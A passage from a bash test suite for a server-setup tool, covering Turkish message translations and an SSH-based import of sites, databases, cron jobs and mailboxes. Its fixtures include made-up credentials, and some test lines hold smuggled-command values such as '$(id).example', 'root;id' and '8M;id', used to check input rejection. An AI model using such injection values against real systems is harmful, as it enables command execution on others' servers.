  _u_en="$("$_u")"; _u_tr="$( LIB_LANG="tr"; "$_u" )"
  assert_true  "${_u}: there is a Turkish text"            test -n "$_u_tr" -a "$_u_tr" != "$_u_en"
  assert_eq    "${_u}: it names the same options"          "$(_uo <<<"$_u_en")" "$(_uo <<<"$_u_tr")"
  assert_lacks "${_u}: and does not say Usage: in English" "Usage:" "$_u_tr"
  assert_lacks "${_u}: the English one is as it was"       "Kullanım" "$_u_en"
done
assert_has  "the command reference in Turkish"   "KOMUTLAR" "$( LIB_LANG="tr"; lib_usage )"
assert_has  "names every command the English one does: rename" "rename <old> <new>" "$( LIB_LANG="tr"; lib_usage )"
assert_eq   "and has as many command lines as the English one" \
  "$(lib_usage | grep -cE '^  [a-z][a-z-]+( |$)')" "$( LIB_LANG="tr"; lib_usage | grep -cE '^  [a-z][a-z-]+( |$)' )"
# "lomp help" and --help are answered before anything else is set up: the language has to be
# known by then, or the reference comes out in English on a server that speaks Turkish
assert_eq   "setup.sh asks for the language before it prints the reference, both ways in" 2 \
  "$(grep -c 'lib_lang_load help; lib_usage' "$ROOT/setup.sh")"
assert_lacks "and never prints it without" "lib_usage; " "$(grep -v 'lib_lang_load help; lib_usage' "$ROOT/setup.sh" | grep -v '^ *#' | grep 'lib_usage;' || true)"
if true; then
  _u_help="$(LOMP_LANG=tr bash "$ROOT/setup.sh" help 2>/dev/null | head -n 12)"
  assert_has "lomp help, asked for in Turkish, is Turkish" "KULLANIM" "$_u_help"
  _u_help="$(LOMP_LANG=tr bash "$ROOT/setup.sh" --help 2>/dev/null | head -n 12)"
  assert_has "and so is --help" "KULLANIM" "$_u_help"
  _u_help="$(bash "$ROOT/setup.sh" help 2>/dev/null | head -n 12)"
  assert_has "piped and without a language it is the English one" "USAGE" "$_u_help"
fi
assert_eq   "a one-line usage" "Kullanım: lomp php-cleanup [--php 8.3]" "$(_dt_plain "Usage: lomp php-cleanup [--php 8.3]")"
unset -f _uo
# import: the lines its own Turkish did not have, and the table of what was found there
assert_eq   "import: a refusal"  "--path ve --as birlikte verilir" "$(_dt_plain "--path and --as go together")"
assert_eq   "its reason"         "oradaki bir dizin buradaki bir site olur" "$(_dt_plain "one directory there becomes one site here")"
assert_eq   "a site that cannot be taken" "a.example burada bir proxy sitesi" "$(_dt_plain "a.example is a proxy site here")"
assert_eq   "a copy that failed" "a.example kopyalanamadı: /var/www/a/wp-config.php yok" "$(_dt_plain "a.example could not be copied: /var/www/a/wp-config.php is missing")"
assert_eq   "a mailbox that could not be made" "info@a.example posta kutusu oluşturulamadı" "$(_dt_plain "The mailbox info@a.example could not be made")"
assert_eq   "the choice that is none" "\"9\" listedeki seçeneklerden biri değil" "$(_dt_plain "\"9\" is not a choice from the list")"
assert_eq   "what to run again"  "bunları giderip aktarımı yalnızca onlar için yeniden çalıştırın: --only a.example,b.example" "$(_dt_plain "clear them up and run the import again for those: --only a.example,b.example")"
if declare -F lib_import_list_print >/dev/null; then
  _il() {   # tr|en -> the list of what was found on the other server
    (
      IMP_SSH_TARGET="root@old.example"; IMP_DOMAIN=(a.example b.example c.example d.example); IMP_KB=(2048 1024 512 512); IMP_KIND=(wordpress php php php)
      IMP_DB=(a_db - - -); IMP_ROOT=(/var/www/a /var/www/b /var/www/c /var/www/d); IMP_NAMELESS=(); IMP_OPT_ONLY_MAIL=0; C_BLD=""; C_RST=""
      eval 'lib_import_here() { case "$1" in a.example) printf "new" ;; b.example) printf "exists" ;; c.example) printf "a redirect here" ;; *) printf "a proxy site here" ;; esac; }
            _import_boxes_of() { if [[ "$1" == a.example ]]; then printf "info@a.example\nsales@a.example\n"; fi; }
            _import_aliases_of() { :; }
            _import_mail_kb() { printf 0; }'
      if [[ "$1" == "tr" ]]; then LIB_LANG="tr"; lib_lang_build; fi
      lib_import_list_print
    )
  }
  _o="$(_il tr)"
  assert_has  "import --list: the headings in Turkish" "ALAN ADI" "$_o"
  assert_has  "its kinds and databases" "TÜR        VERİTABANI            KUTULAR  " "$_o"
  assert_has  "to the last column"  "KUTULAR    TAKMA AD  BURADA        ORADAKİ DİZİN" "$_o"
  assert_has  "a site that would be new, with its mailboxes counted" "a_db                  2          -         yeni          /var/www/a" "$_o"
  assert_has  "one that is here already, its columns in line" "-                     -          -         var           /var/www/b" "$_o"
  assert_has  "a name that redirects here, in a word that fits the column" "-         yönlendirme   /var/www/c" "$_o"
  assert_has  "and a site of another kind" "-         proxy sitesi  /var/www/d" "$_o"
  assert_has  "in English too"      "-         redirect      /var/www/c" "$(_il en)"
  assert_has  "both of them"        "-         proxy site    /var/www/d" "$(_il en)"
  assert_has  "in English the list is what it was" "TYPE       DATABASE              MAILBOXES  ALIASES   HERE          DIRECTORY THERE" "$(_il en)"
  assert_has  "row and all"         "a_db                  2          -         new           /var/www/a" "$(_il en)"
  unset -f _il
fi
# a worker's states are words of the table as well
if declare -F _app_worker_rows >/dev/null; then
  _wr() { ( if [[ "$1" == "tr" ]]; then LIB_LANG="tr"; lib_lang_build; fi
            _app_worker_rows '[{"name":"queue","kind":"process","port":null,"status":"not running","restarts":0,"start":"npm run queue"},
                               {"name":"mailer","kind":"job","schedule":"*/5 * * * *","status":"scheduled","restarts":0,"start":"npm run mail"},
                               {"name":"sync","kind":"process","port":3101,"status":"stopping","restarts":2,"start":"npm run sync"}]' ) 2>&1 || true; }
  _o="$(_wr tr)"
  assert_has  "a worker that does not run, in Turkish" "queue            süreç    -              çalışmıyor          0  npm run queue" "$_o"
  assert_has  "a job that waits for its time"          "mailer           iş       */5 * * * *    zamanlanmış         -  npm run mail" "$_o"
  assert_has  "one on its way down"                    "sync             süreç    3101           durduruluyor        2  npm run sync" "$_o"
  assert_has  "in English they are what they were"     "queue            process  -              not running         0  npm run queue" "$(_wr en)"
  unset -f _wr
fi
# lib_tprintf: printf for a table
_tp() { ( LIB_LANG="tr"; lib_lang_build; lib_tprintf "$@" ); }
assert_eq   "in English it is printf, flags and all" "$(printf '%-10s|%5s|%4s%%|%d|%s\n' MODE SIZE 7 3 x)" "$(lib_tprintf '%-10s|%5s|%4s%%|%d|%s\n' MODE SIZE 7 3 x)"
assert_eq   "in Turkish a heading is looked up and padded to the same column" "MOD       |BOYUT|   7%|3|x" "$(_tp '%-10s|%5s|%4s%%|%d|%s\n' MODE SIZE 7 3 x)"
assert_eq   "Turkish letters count as one each" "VERİTABANI  |SİTE  |" "$(_tp '%-12s|%-6s|\n' DATABASE SITE)"
assert_eq   "right-aligned too" "   SİTE|" "$(_tp '%7s|\n' SITE)"
assert_eq   "what has no line of its own stays" "a.example   |/home/a.example|" "$(_tp '%-12s|%s|\n' a.example /home/a.example)"
assert_eq   "a sentence is not looked up as a pattern: only whole arguments are" "Site a.example is not registered" "$(_tp '%s\n' "Site a.example is not registered")"
assert_eq   "an argument longer than its column is not cut" "YÜKLEME DİZİNLERİNDE BETİK|x" "$(_tp '%-5s|%s\n' "SCRIPTS IN UPLOAD DIRS" x)"
assert_eq   "colours pass through untouched" $'\033[1mMOD  \033[0m' "$(_tp '%s%-5s%s\n' $'\033[1m' MODE $'\033[0m')"
assert_eq   "a format with no argument left prints what printf would" "a||" "$(_tp '%s|%s|\n' a)"
# what a dry run says it would do
_dd() { ( OPT_DRY_RUN=1; OPT_QUIET=0; C_MAG=""; C_RST=""; if [[ "$1" == "tr" ]]; then LIB_LANG="tr"; lib_lang_build; fi; lib_mkdir "$TMP/dry-new-dir" 0755 2>&1; lib_rm "$TMP" 2>&1 ); }
assert_has  "a dry run in Turkish: a directory" "[dry ]  $TMP/dry-new-dir dizini oluşturulacaktı" "$(_dd tr)"
assert_has  "a removal"                         "[dry ]  $TMP kaldırılacaktı" "$(_dd tr)"
assert_has  "in English it says what it said"   "[dry ]  would create directory $TMP/dry-new-dir" "$(_dd en)"
assert_true "and nothing was created or removed" test -d "$TMP" -a ! -e "$TMP/dry-new-dir"
unset -f _tp _dd
# the other commands: a line from each of them, so that a module whose messages fell out of
# the table is noticed
assert_eq   "install"  "SSH port değişikliği başarısız oldu ve geri alındı" "$(_dt_plain "SSH port change failed and was reverted")"
assert_eq   "a site"   "WordPress için bir veritabanı gerekli" "$(_dt_plain "WordPress needs a database")"
assert_eq   "a database" "b_db veritabanı geri yüklendi" "$(_dt_plain "Database b_db restored")"
assert_eq   "a backup" "Zamanlanmış yedekler kapalı (/var/backups/server-setup içindeki arşivler kalır)" "$(_dt_plain "Scheduled backups are off (the archives in /var/backups/server-setup stay)")"
assert_eq   "mail"     "a.example için posta kapalı ve posta kutuları silindi" "$(_dt_plain "Mail is off for a.example and its mailboxes are gone")"
assert_eq   "a quota"  "Geçersiz kota '5X'" "$(_dt_plain "Invalid quota '5X'")"
assert_eq   "OpenLiteSpeed" "OpenLiteSpeed yeniden yüklenemedi (add vhost a.example)" "$(_dt_plain "OpenLiteSpeed failed to reload (add vhost a.example)")"
assert_eq   "tuning"   "Swap gerekmiyor (RAM 8 GB)" "$(_dt_plain "No swap needed (RAM 8 GB)")"
assert_eq   "a dry run keeps its tag" "[dry-run] /home/a.example/logs içindeki loglar /var/log/lomp-sites/a.example içine taşınacaktı" "$(_dt_plain "[dry-run] would move the logs in /home/a.example/logs to /var/log/lomp-sites/a.example")"
assert_eq   "a command in a message is not touched" "soruyu atlamak için --yes ile yeniden çalıştırın" "$(_dt_plain "re-run with --yes to skip the question")"
assert_true "the table holds a couple of thousand lines now" test "${#LIB_TR_PAIRS[@]}" -ge 3800
# no line of the table may be so general that it takes another message for its own: one that
# begins or ends with a value needs words of its own around it
_dt_gen=""
for (( _dt_i = 0; _dt_i + 1 < ${#LIB_TR_PAIRS[@]}; _dt_i += 2 )); do
  _dt_en="${LIB_TR_PAIRS[_dt_i]}"
  [[ "$_dt_en" == "@doctor "* ]] && continue
  [[ "$_dt_en" == "{1}"* ]] || continue
  _dt_w="${_dt_en//\{[1-9]\}/ }"
  # shellcheck disable=SC2086
  set -- $_dt_w
  (( $# >= 2 )) || _dt_gen+="[${_dt_en}] "
done
assert_eq   "a line that starts with a value has at least two words of its own" "" "$_dt_gen"
[[ -z "$_dt_fn" ]] || eval "$_dt_fn"
unset -f _dt _dt_plain _dt_run _st

section "import: the sites of another server, brought here over SSH"
# The other server is a directory tree under $TMP, and what would run there through ssh runs
# here through sh: the listing, tar and the dump script are the real ones. mysqldump and the
# client are stand-ins that say how they were called.
_im_saved="$(declare -p STATE_DIR OPT_DRY_RUN MAIL_PASSWD_FILE MAIL_ALIAS_DIR CRON_FILE)"
CRON_FILE="$TMP/im-cron"
_im_orig="$(declare -f _domain_fix_owner_ids lib_require_tools lib_require_installed lib_server_mail_only lib_backup_domain \
  lib_db_create_for_domain lib_db_restore_domain lib_db_sql lib_domain_apply_config lib_ols_htaccess_reload \
  lib_import_connect _import_ssh _import_add _import_php_available _import_php_defaults _import_mail_on _import_mail_sync lib_mail_installed lib_mail_domain_enabled lib_mail_hash_password lib_mail_tables_apply lib_mail_domain_aliases_seed _mail_stage_dir _mail_stage_drop _mail_sendas_current)"
STATE_DIR="$TMP/im-state"; mkdir -p "$STATE_DIR"
_im_r="$TMP/im-remote"; _im_l="$_im_r/usr/local/lsws"; _im_bin="$TMP/im-bin"; _im_log="$TMP/im.log"; _im_out="$TMP/im.out"
_im_shop="$_im_r/home/shop.example/public_html"
mkdir -p "$_im_l/conf/vhosts/Example" "$_im_l/conf/vhosts/shop.example" "$_im_l/Example/html" \
  "$_im_shop/wp-content/cache" "$_im_shop/wp-content/uploads" "$_im_r/home/blog.example/public_html" \
  "$_im_r/home/bob/public_html" "$_im_r/var/www/html" "$_im_r/www/wwwroot/WWW.Panel.Example" \
  "$_im_r/home/odd name.example/public_html" "$_im_r/home/empty.example" "$_im_bin"
cat >"$_im_l/conf/httpd_config.conf" <<EOF
serverName                lsws
extprocessor lsphp {
  type                    lsapi
  path                    $_im_l/lsphp81/bin/lsphp
}
virtualhost Example {
  vhRoot                  Example/
  configFile              conf/vhosts/Example/vhconf.conf
}
virtualhost shop.example {
  vhRoot                  $_im_r/home/\$VH_NAME
  configFile              \$SERVER_ROOT/conf/vhosts/\$VH_NAME/vhconf.conf
}
listener Default {
  address                 *:80
  map                     Example *
  map                     shop.example shop.example, WWW.shop.example
}
EOF
printf 'docRoot                   $VH_ROOT/html/\n' >"$_im_l/conf/vhosts/Example/vhconf.conf"
printf 'docRoot                   $VH_ROOT/public_html\nextprocessor shop {\n  path  /usr/local/lsws/lsphp74/bin/lsphp\n}\nphpIniOverride  {\n  php_admin_value memory_limit 1G\n  php_value upload_max_filesize 16M\n}\n' >"$_im_l/conf/vhosts/shop.example/vhconf.conf"
# the limits of a virtual host that overrides nothing: its .user.ini, then the php.ini of its PHP
mkdir -p "$_im_l/lsphp81/etc/php/8.1/litespeed"
printf '%s\n' '[PHP]' '; memory_limit = 32M' 'memory_limit = 768M ; plenty' 'upload_max_filesize=8388608' >"$_im_l/lsphp81/etc/php/8.1/litespeed/php.ini"
printf 'upload_max_filesize = 300M\n' >"$_im_l/Example/html/.user.ini"
# its cron jobs: the crontab of the account the shop's files belong to (whose home the shop is),
# root's crontab, a file in /etc/cron.d, and the file lomp itself keeps on a server it runs
# (an account of the fixture's own, named to the listing: whoever runs the suite - root, too -
# is then not the one whose crontab this is)
_im_me="shopowner"
mkdir -p "$_im_r/etc/cron.d" "$_im_r/var/spool/cron/crontabs"
printf '%s:x:1000:1000::%s:/bin/sh\n' "$_im_me" "$_im_r/home/shop.example" >"$_im_r/etc/passwd"
printf '%s\n' '# the shop' 'MAILTO=owner@shop.example' \
  "*/5 * * * * /usr/local/lsws/lsphp74/bin/php $_im_shop/cron.php >/dev/null 2>&1" \
  "@daily	cd $_im_r/home/shop.example && ./nightly.sh" '@reboot /bin/true' >"$_im_r/var/spool/cron/crontabs/$_im_me"
printf '%s\n' '0 3 * * * curl -s https://blog.example/cron.php' '1 1 * * * /bin/unrelated --flag' >"$_im_r/var/spool/cron/crontabs/root"
printf '%s\n' 'PATH=/usr/bin' "30 2 * * mon www-data php $_im_r/home/blog.example/public_html/job.php" >"$_im_r/etc/cron.d/site-jobs"
printf '%s\n' "* * * * * root /usr/local/sbin/lompstack htaccess-check blog.example" >"$_im_r/etc/cron.d/server-setup"
cat >"$_im_shop/wp-config.php" <<'EOF'
<?php
define( 'DB_NAME', 'shopdb' );
define("DB_USER", "shopuser");
define( 'DB_PASSWORD', 'p\'a"s\\x' ); // the old one
define( 'DB_HOST', 'localhost:/run/mysqld/old.sock' );
$table_prefix = 'wx_';
require_once ABSPATH . 'wp-settings.php';
EOF
printf '<?php // shop\n' >"$_im_shop/index.php"
printf 'RewriteEngine On\n' >"$_im_shop/.htaccess"
printf 'cached\n' >"$_im_shop/wp-content/cache/page.html"
printf 'upload\n' >"$_im_shop/wp-content/uploads/a.txt"
printf 'the blog\n' >"$_im_r/home/blog.example/public_html/index.html"
printf 'bob\n' >"$_im_r/home/bob/public_html/index.html"
printf '<?php // default\n' >"$_im_r/var/www/html/index.php"
printf '<?php // panel\n' >"$_im_r/www/wwwroot/WWW.Panel.Example/index.php"
printf 'odd\n' >"$_im_r/home/odd name.example/public_html/index.html"
printf 'example page\n' >"$_im_l/Example/html/index.html"
cat >"$_im_bin/mysqldump" <<'EOF'
#!/bin/sh
for a in "$@"; do case "$a" in --defaults-extra-file=*) echo "-- LOGIN"; cat "${a#*=}" ;; esac; done
echo "-- ARGS $*"
[ "${IM_DUMP_MODE:-}" != fail ] || exit 2
echo "CREATE TABLE t (c text) COLLATE=utf8mb4_0900_ai_ci;"
[ "${IM_DUMP_MODE:-}" = cut ] || echo "-- Dump completed on 2026-10-05"
EOF
cat >"$_im_bin/mysql" <<'EOF'
#!/bin/sh
# lets in whoever logs in as $IM_CLIENT_USER through an option file; otherwise $IM_CLIENT_RC
for a in "$@"; do
  case "$a" in --defaults-extra-file=*)
    if [ -n "${IM_CLIENT_USER:-}" ] && grep -q "^user=\"$IM_CLIENT_USER\"\$" "${a#*=}"; then exit 0; fi ;;
  esac
done
exit "${IM_CLIENT_RC:-1}"
EOF
# an application that is no WordPress: its login in two files, the nearer one out of date
_im_crm="$_im_r/home/crm.example/public_html"; _im_cf="$TMP/im-conf"
mkdir -p "$_im_crm/include" "$_im_crm/vendor" "$_im_crm/admin" "$_im_cf"
printf '<?php // crm\n' >"$_im_crm/index.php"
cat >"$_im_crm/config.php" <<'EOF'
<?php
// $db_name = 'commented_out';
$db_host = "localhost";
$db_name = 'crmdb';   // the database
$db_user = 'stale';
$db_pass = 'old\'s "pw"';
$smtp_host = 'smtp.example.org'; $password = 'smtp-secret';
EOF
cat >"$_im_crm/include/db.php" <<'EOF'
<?php
$baglanti = mysqli_connect("localhost", "crmuser", "crm-pw", "crmdb");
EOF
printf '<?php\n$db_name = "otherdb"; $db_user = "other"; $db_pass = "x";\n' >"$_im_crm/admin/config.php"
mkdir -p "$_im_crm/app"
printf '%s\n' 'APP_ENV=production' 'DB_DATABASE=crmdb' 'DB_USERNAME=envcrm' 'DB_PASSWORD=env-secret' >"$_im_crm/app/.env"
printf '<?php\n$db_name = "crmdb"; $db_user = "vendored"; $db_pass = "x";\n' >"$_im_crm/vendor/config.php"
# the ways a login is written
printf '%s\n' '<?php' 'define("DB_HOST", "db.internal:3307");' "define( 'DB_DATABASE', 'defdb' );" "define('DB_USERNAME','defuser');" "define('DB_PASSWORD', 'def;pw');" >"$_im_cf/define.php"
printf '%s\n' '<?php' '$db["default"] = array(' "  'hostname' => 'localhost'," "  'username' => 'ciuser'," "  'password' => 'ci pw'," "  'database' => 'cidb'," ');' >"$_im_cf/array.php"
printf '%s\n' '# settings' 'APP_NAME=shop' 'DB_HOST="127.0.0.1"' 'DB_DATABASE=envdb' 'DB_USERNAME=envuser' 'DB_PASSWORD=env-pw1   # the password' >"$_im_cf/.env"
printf '%s\n' '<?php' '$c = new mysqli("localhost", "same", "pw5", "same");' >"$_im_cf/call.php"
printf '%s\n' '<?php' "\$pdo = new PDO(\"mysql:host=dbhost;dbname=pdodb;charset=utf8\", \$u, \$p);" >"$_im_cf/pdo.php"
printf '%s\n' '<?php' '$sunucu = "localhost"; ' '$veritabani = "trdb";' '$kullanici = "truser";' '$sifre = "tr$ifre";' >"$_im_cf/turkce.php"
printf '%s\n' '<?php' '$mail = array("host" => "smtp.example.org", "username" => "mailer", "password" => "mail-pw");' \
  '$db_name = "realdb"; $db_user = "realuser"; $db_pass = "real-pw";' >"$_im_cf/mixed.php"
cp "$_im_bin/mysqldump" "$_im_bin/mariadb-dump"; cp "$_im_bin/mysql" "$_im_bin/mariadb"
# the other server's mail: three addresses Dovecot knows, the Maildir of two of them, and the
# hashes of lomp's own password file - one that can be taken over, one that cannot
_im_users="info@shop.example sales@shop.example boss@mailonly.example"
_im_hash='{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuuJ1c0aN1X1X1X1X1X1X1X1X1X1X1X1X1u'
_im_md="$_im_r/home/vmail/shop.example/info/Maildir"
mkdir -p "$_im_md/cur" "$_im_md/new" "$_im_md/tmp" "$_im_md/.Sent/cur" "$_im_r/etc/dovecot/lomp" \
  "$_im_r/home/vmail/mailonly.example/boss/Maildir/cur"
printf 'Subject: one\n\nfirst\n' >"$_im_md/cur/1700000000.M1P1.old:2,S"
printf 'Subject: two\n\nsent\n' >"$_im_md/.Sent/cur/1700000001.M2P1.old:2,S"
printf '3 V1700000000 N2\n' >"$_im_md/dovecot-uidlist"
printf 'index\n' >"$_im_md/dovecot.index"; printf 'cache\n' >"$_im_md/.Sent/dovecot.index.cache"
printf 'Subject: boss\n\nhello\n' >"$_im_r/home/vmail/mailonly.example/boss/Maildir/cur/1700000002.M3P1.old:2,S"
printf '%s\n' "info@shop.example:${_im_hash}::::::userdb_quota_rule=*:storage=1G" \
  'boss@mailonly.example:{PLAIN}secret-of-the-boss::::::userdb_quota_rule=*:storage=1G' >"$_im_r/etc/dovecot/lomp/passwd"
# its aliases: lomp's own file for one domain, and a file Postfix looks its aliases up in. The
# second file Postfix names is the one lomp renders from the first, and is not read again.
mkdir -p "$_im_r/root/.server-setup/mail/aliases" "$_im_r/etc/postfix/lomp"
printf '%s\n' '# Managed by lompstack - aliases of shop.example' $'sales2@shop.example\tinfo@shop.example' \
  $'info@shop.example\tinfo@shop.example,ext@far.example' $'@shop.example\tinfo@shop.example' \
  $'postmaster@shop.example\tadmin@elsewhere.example' >"$_im_r/root/.server-setup/mail/aliases/shop.example"
printf '%s\n' '# a comment' 'fwd@fwdonly.example   a@one.example, b@two.example' 'sales2@shop.example other@x.example' \
  'notanaddress   x@y.example' >"$_im_r/etc/postfix/virtual"
printf 'rendered@shop.example\tx@y.example\n' >"$_im_r/etc/postfix/lomp/valias"
cat >"$_im_bin/postconf" <<'EOF'
#!/bin/sh
echo "hash:$LOMP_IMPORT_ROOT/etc/postfix/lomp/valias, hash:$LOMP_IMPORT_ROOT/etc/postfix/virtual, mysql:/etc/postfix/x.cf"
EOF
cat >"$_im_bin/doveadm" <<'EOF'
#!/bin/sh
if [ "$1" = user ]; then printf '%s\n' $IM_MAIL_USERS; exit 0; fi
if [ "$1 $2" = "mailbox path" ]; then u="$4"; printf '%s/home/vmail/%s/%s/Maildir\n' "$LOMP_IMPORT_ROOT" "${u#*@}" "${u%@*}"; exit 0; fi
exit 1
EOF
chmod +x "$_im_bin"/*

# ---- the listing, as the other server writes it ------------------------------
_im_scan="$(lib_import_remote_scan | env PATH="$_im_bin:$PATH" LOMP_IMPORT_ROOT="$_im_r" LOMP_IMPORT_OWNER="$_im_me" IM_MAIL_USERS="$_im_users" sh -s)"
_im_mrow() { awk -F'\t' -v a="$1" '$1 == "M" && $2 == a { print $3 "|" $5; exit }' <<<"$_im_scan"; }
assert_eq  "a mailbox Dovecot knows, where its mail lies and the hash it logs in with" "$_im_md|$_im_hash" "$(_im_mrow info@shop.example)"
assert_eq  "one whose Maildir is not there, and whose hash is not known" "-|-" "$(_im_mrow sales@shop.example)"
assert_has "a domain that has only mail there"                 "boss@mailonly.example" "$_im_scan"
assert_has "an alias from lomp's own file"                     $'A\tsales2@shop.example\tinfo@shop.example' "$_im_scan"
assert_has "a catch-all"                                       $'A\t@shop.example\tinfo@shop.example' "$_im_scan"
assert_has "a forwarder from a file Postfix reads, its targets in one list" $'A\tfwd@fwdonly.example\ta@one.example,b@two.example' "$_im_scan"
assert_lacks "the file lomp renders is not read a second time" "rendered@shop.example" "$_im_scan"
_im_row() { awk -F'\t' -v d="$1" '$1 == "S" && $2 == d { print $3 "|" $5 "|" $6 "|" $7 "|" $8 "|" $9; exit }' <<<"$_im_scan"; }
_im_php() { awk -F'\t' -v d="$1" -v r="$2" '$1 == "S" && ($2 == d || $3 == r) { print $10; exit }' <<<"$_im_scan"; }
assert_eq  "the PHP a virtual host runs, from its own processor"      "7.4" "$(_im_php shop.example -)"
assert_eq  "or the one the server gives every virtual host"           "8.1" "$(_im_php none "$_im_l/Example/html")"
assert_eq  "a directory that is no virtual host has none to name"     "-"   "$(_im_php blog.example -)"
_im_lim() { awk -F'\t' -v d="$1" -v r="$2" '$1 == "S" && ($2 == d || $3 == r) { print $11 "|" $12; exit }' <<<"$_im_scan"; }
assert_eq  "the limits a virtual host sets for itself"                "1G|16M" "$(_im_lim shop.example -)"
assert_eq  "or its .user.ini, or the php.ini of the PHP it runs"      "768M|300M" "$(_im_lim none "$_im_l/Example/html")"
assert_eq  "a directory that is no virtual host has none to name"     "-|-" "$(_im_lim blog.example -)"
IMP_MEM=(100 1024 -); IMP_UPL=(16 200 -); IMP_DEF_MEM=256; IMP_DEF_UPL=64
assert_eq  "limits below this server's own are not passed on" "" "$(_import_php_limits 0 | tr '\n' ' ')"
assert_eq  "limits above it are, each by its option"     "--memory 1024M --upload 200M " "$(_import_php_limits 1 | tr '\n' ' ')"
assert_eq  "limits that are not known are none"          "" "$(_import_php_limits 2 | tr '\n' ' ')"
IMP_DEF_MEM=1024
assert_eq  "one that equals it is not passed either"     "--upload 200M " "$(_import_php_limits 1 | tr '\n' ' ')"
assert_eq  "megabytes"                 "128"  "$(_import_size_mb 128M)"
assert_eq  "gigabytes, in any case"    "1024" "$(_import_size_mb 1g)"
assert_eq  "kilobytes"                 "64"   "$(_import_size_mb 65536K)"
assert_eq  "a number of bytes"         "256"  "$(_import_size_mb 268435456)"
assert_eq  "no limit at all is not one to carry over" "-" "$(_import_size_mb -1)"
assert_eq  "nor is nothing"            "-"    "$(_import_size_mb "")"
assert_eq  "nor a word"                "-"    "$(_import_size_mb '8M;id')"
assert_eq  "nor less than a megabyte"  "-"    "$(_import_size_mb 4096)"
assert_eq  "nor more than any request gets" "-" "$(_import_size_mb 64G)"
_im_crow() { awk -F'\t' -v r="$1" '$1 == "C" && $2 == r { print $3 "|" $4 }' <<<"$_im_scan" | sort -u; }
assert_has "the crontab of the account whose home the site is: every line" \
  "*/5 * * * *|/usr/local/lsws/lsphp74/bin/php $_im_shop/cron.php >/dev/null 2>&1" "$(_im_crow "$_im_shop")"
assert_has "a tab between when and what is a blank"                   "@daily|cd $_im_r/home/shop.example && ./nightly.sh" "$(_im_crow "$_im_shop")"
assert_lacks "a setting is no job"                                    "MAILTO" "$(_im_crow "$_im_shop")"
assert_has "a line of root's that names the domain"                   "0 3 * * *|curl -s https://blog.example/cron.php" "$(_im_crow "$_im_r/home/blog.example/public_html")"
assert_has "a line of /etc/cron.d that names the directory, without its user" \
  "30 2 * * mon|php $_im_r/home/blog.example/public_html/job.php" "$(_im_crow "$_im_r/home/blog.example/public_html")"
assert_lacks "what lomp schedules itself is not a job of the site"    "htaccess-check" "$_im_scan"
assert_lacks "a line of root's that names no site is nobody's"        "/bin/unrelated" "$_im_scan"
assert_lacks "the shop's jobs are not the blog's"                     "nightly" "$(_im_crow "$_im_r/home/blog.example/public_html")"
assert_has "the listing says who it ran as"                    $'U\t' "$_im_scan"
assert_eq  "a virtual host goes by the names its listener maps to it" \
  "$_im_shop|wordpress|shopdb|1|$_im_shop/wp-config.php|ols" "$(_im_row shop.example)"
assert_eq  "a directory named after a domain is a site"        "$_im_r/home/blog.example/public_html|static|-|0|-|dir" "$(_im_row blog.example)"
assert_eq  "its name without www and in small letters"         "$_im_r/www/wwwroot/WWW.Panel.Example|php|-|0|-|dir" "$(_im_row panel.example)"
assert_has "a virtual host mapped to * has no name"            $'S\t-\t'"$_im_l/Example/html"$'\t' "$_im_scan"
assert_has "nor has a user's public_html"                      $'S\t-\t'"$_im_r/home/bob/public_html"$'\t' "$_im_scan"
assert_lacks "a directory that serves nothing is not listed"   "empty.example" "$_im_scan"
assert_eq  "one directory on request"  "S|-|$_im_l/Example/html|static|path" \
  "$(lib_import_remote_scan | LOMP_IMPORT_ONLY="$_im_l/Example/html" sh -s | awk -F'\t' '$1 == "S" { print $1 "|" $2 "|" $3 "|" $5 "|" $9 }')"

lib_import_scan_parse <<<"$_im_scan"
assert_eq  "each site once, the virtual hosts first"           "shop.example blog.example crm.example panel.example mailonly.example fwdonly.example" "${IMP_DOMAIN[*]}"
assert_eq  "with what it is"                                   "wordpress static php php mail mail" "${IMP_KIND[*]}"
assert_eq  "its database"                                      "shopdb - crmdb - - -" "${IMP_DB[*]}"
assert_eq  "and whether www is served"                         "1 0 0 0 0 0" "${IMP_WWW[*]}"
assert_eq  "the PHP each runs, where that is known"                "7.4 - - - - -" "${IMP_PHP[*]}"
assert_eq  "its limits, in megabytes"                              "1024 16 - -" "${IMP_MEM[0]} ${IMP_UPL[0]} ${IMP_MEM[1]} ${IMP_UPL[1]}"
assert_eq  "the shop's jobs, without the one that is no schedule"  "2" "$(_import_cron_of "$_im_shop" | wc -l | tr -d ' ')"
assert_eq  "the blog's two"                                        "2" "$(_import_cron_of "$_im_r/home/blog.example/public_html" | wc -l | tr -d ' ')"
assert_lacks "@reboot is not taken"                                "@reboot" "${IMP_CRON_WHEN[*]}"
assert_eq  "the aliases, each once: the first place that names one counts" "sales2@shop.example info@shop.example @shop.example postmaster@shop.example fwd@fwdonly.example" "${IMP_ALIAS[*]}"
assert_eq  "with where they go"                                "info@shop.example|a@one.example,b@two.example" "${IMP_ALIAS_TO[0]}|${IMP_ALIAS_TO[4]}"
assert_eq  "the mailboxes, each with its domain"               "info@shop.example sales@shop.example boss@mailonly.example" "${IMP_BOX[*]}"
assert_eq  "a hash that is a password in the clear is not one" "$_im_hash - -" "${IMP_BOX_HASH[*]}"
assert_eq  "the directories without a name are kept apart"     "3" "${#IMP_NAMELESS[@]}"
assert_lacks "a path with a blank in it is not taken"          "odd" "${IMP_NAMELESS[*]} ${IMP_ROOT[*]}"
assert_eq  "the user it ran as"                                "$(id -un)" "$IMP_REMOTE_USER"
# the listing is another machine's output
printf '%s\n' $'S\t$(id).example\t/srv/a\t1\tphp\t-\t0\t-\tdir' $'S\tquote.example\t/srv/it\'s\t1\tphp\t-\t0\t-\tdir' \
  $'S\tup.example\t/srv/../etc\t1\tphp\t-\t0\t-\tdir' $'S\tkind.example\t/srv/k\t1\tperl\t-\t0\t-\tdir' \
  $'S\tdb.example\t/srv/db\tmany\tphp\ta\';b\t7\t/srv/c onf\tdir' $'U\troot;id' $'X\tjunk' | lib_import_scan_parse
assert_eq  "a line counts only when its fields are what they should be" "db.example" "${IMP_DOMAIN[*]}"
assert_eq  "a database name with a quote in it is no database" "-|0|0|-" "${IMP_DB[0]}|${IMP_KB[0]}|${IMP_WWW[0]}|${IMP_CONF[0]}"
assert_eq  "a name that is no domain name names no site"       "/srv/a" "${IMP_NAMELESS[*]}"
assert_eq  "nor is that a user name"                           "" "$IMP_REMOTE_USER"

